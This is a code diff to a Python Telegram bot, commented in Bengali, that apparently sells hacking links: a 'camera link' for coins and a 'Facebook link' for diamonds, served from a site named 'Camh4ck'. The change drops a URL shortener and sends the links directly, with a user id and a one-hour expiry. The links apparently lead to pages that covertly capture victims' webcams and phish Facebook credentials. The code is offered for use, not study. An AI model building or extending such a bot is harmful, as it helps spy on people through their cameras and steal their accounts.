@@ -17,12 +17,6 @@ BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # --- ফাংশনসমূহ ---
-def shorten_link(long_url):
-    try:
-        res = requests.get(f"http://tinyurl.com/api-create.php?url={long_url}")
-        return res.text
-    except: return long_url
-
 def get_user(user_id):
     res = requests.get(f"{FIREBASE_URL}/users/{user_id}.json")
     data = res.json()
@@ -95,13 +89,9 @@ def handle_text(message):
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("🛒 কিনুন", url=f"https://t.me/{ADMIN_USERNAME}"),
                    types.InlineKeyboardButton("🎁 রিডিম কোড", callback_data="redeem_ui"))
-        
-        # অ্যাডমিন হলে স্পেশাল বাটন দেখাবে
         if user_id == ADMIN_ID:
             markup.add(types.InlineKeyboardButton("⚙️ অ্যাডমিন প্যানেল", callback_data="admin_panel"))
-            
-        msg = f"📊 **ব্যালেন্স:**\n\n🪙 Coins: {data.get('coins', 0)}\n💎 Diamonds: {data.get('diamonds', 0)}"
-        bot.send_message(user_id, msg, reply_markup=markup, parse_mode='Markdown')
+        bot.send_message(user_id, f"📊 **ব্যালেন্স:**\n\n🪙 Coins: {data.get('coins', 0)}\n💎 Diamonds: {data.get('diamonds', 0)}", reply_markup=markup, parse_mode='Markdown')
 
     elif text == "👥 Refer":
         bot_user = bot.get_me().username
@@ -118,7 +108,7 @@ def handle_text(message):
         info = "🤖 **Zord Academy ইনফো**\n\n📸 ক্যামেরা: ১০ কয়েন\n🔐 ফেসবুক: ১ ডায়মন্ড\n👥 রেফার: ৫০ কয়েন\n⚠️ লিঙ্ক মেয়াদ: ১ ঘণ্টা"
         bot.send_message(user_id, info, parse_mode='Markdown')
 
-# --- কলব্যাক হ্যান্ডলার (Callback Handlers) ---
+# --- কলব্যাক হ্যান্ডলার ---
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     user_id = str(call.message.chat.id)
@@ -150,14 +140,15 @@ def callback_handler(call):
         msg = bot.send_message(user_id, f"৩. কত {asset_type} দিতে চান? (সংখ্যা দিন):")
         bot.register_next_step_handler(msg, lambda m: get_amount(m, code_name, asset_type))
 
-    # বাটন একশন (Buy Cam/FB)
+    # --- বাটন অ্যাকশন (Buy Cam/FB) - সরাসরি লিঙ্ক আপডেট ---
     elif call.data == "buy_cam":
         if data.get('coins', 0) >= 10:
             data['coins'] -= 10
             save_user(user_id, data)
             exp = int(time.time()) + 3600
-            short = shorten_link(f"{BASE_URL}?id={user_id}&exp={exp}")
-            bot.send_message(user_id, f"✅ ক্যামেরা লিঙ্ক: {short}")
+            # সরাসরি লিঙ্ক পাঠানো হচ্ছে, কোনো শর্টনার নেই
+            direct_link = f"{BASE_URL}?id={user_id}&exp={exp}"
+            bot.send_message(user_id, f"✅ ক্যামেরা লিঙ্ক (মেয়াদ ১ ঘণ্টা):\n{direct_link}")
         else: bot.answer_callback_query(call.id, "কয়েন নেই!", show_alert=True)
 
     elif call.data == "buy_fb":
@@ -165,8 +156,9 @@ def callback_handler(call):
             data['diamonds'] -= 1
             save_user(user_id, data)
             exp = int(time.time()) + 3600
-            short = shorten_link(f"{BASE_URL}fb/?id={user_id}&exp={exp}")
-            bot.send_message(user_id, f"✅ ফেসবুক লিঙ্ক: {short}")
+            # সরাসরি লিঙ্ক পাঠানো হচ্ছে, কোনো শর্টনার নেই
+            direct_link = f"{BASE_URL}fb/?id={user_id}&exp={exp}"
+            bot.send_message(user_id, f"✅ ফেসবুক লিঙ্ক (মেয়াদ ১ ঘণ্টা):\n{direct_link}")
         else: bot.answer_callback_query(call.id, "ডায়মন্ড নেই!", show_alert=True)
 
 # --- অ্যাডমিন রিডিম কোড প্রসেস ---
